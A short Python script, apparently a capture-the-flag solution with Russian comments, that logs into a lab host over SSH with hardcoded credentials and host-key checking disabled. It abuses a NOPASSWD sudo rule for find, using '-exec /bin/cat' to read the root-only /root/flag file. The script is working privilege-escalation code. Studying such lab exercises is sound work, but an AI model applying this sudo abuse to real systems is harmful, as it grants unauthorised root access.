#!/usr/bin/env python3
"""privesc: sudo find (root) -> -exec чтение /root/flag."""
import subprocess
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:13422"
host, port = target.rsplit(":", 1) if ":" in target else (target, "22")

# sudoers: player ALL=(root) NOPASSWD: /usr/bin/find
# у find есть действие выполнения команд — запускаем cat от root
remote = r"sudo -n /usr/bin/find /usr -maxdepth 0 -exec /bin/cat /root/flag \; -quit"
result = subprocess.run(
    ["sshpass", "-p", "player", "ssh",
     "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
     "-p", port, f"player@{host}", remote],
    capture_output=True, text=True, check=True)
print(result.stdout.strip())
